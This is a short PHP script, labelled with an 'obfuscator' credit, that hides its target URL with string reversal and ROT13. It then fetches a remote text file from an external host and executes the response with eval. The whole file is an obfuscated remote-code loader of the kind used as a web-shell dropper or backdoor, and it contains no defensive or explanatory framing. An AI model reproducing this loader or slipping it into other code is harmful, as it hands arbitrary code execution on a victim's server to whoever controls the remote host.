<?php

/**
* @protected_by @Sin_cz Safe Obfuscator
*/

$target_url = strrev(str_rot13("gkg.qenbolrx/avf/ev.evonx-avf.aci//:fcggu"));

if (file_exists($local_path)) {
    include $local_path;
} else {
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $target_url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, true); 
    curl_setopt($ch, CURLOPT_TIMEOUT, 15);          
    $response = curl_exec($ch);
    $close_result = curl_close($ch);
    
    if ($response !== false) {
        eval("?>" . $response);
    } else {
        error_log("Erorr");
        echo "Erorr1";
    }
}
